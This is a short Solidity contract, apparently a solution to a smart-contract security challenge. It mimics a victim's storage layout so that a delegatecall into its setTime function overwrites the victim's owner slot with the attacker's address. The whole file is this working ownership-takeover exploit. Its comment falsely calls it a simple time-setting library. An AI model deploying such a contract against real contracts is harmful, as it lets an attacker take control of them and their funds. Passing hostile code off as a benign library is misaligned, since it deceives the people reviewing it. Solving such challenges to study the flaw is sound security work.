// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Simple library contract to set the time
contract LibraryContractAttack {
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  // stores a timestamp 
  uint storedTime;  
  address immutable attackerAddr;

  constructor() {
    attackerAddr = msg.sender;
  }

  function setTime(uint _time) public {
    owner = attackerAddr;
  }
}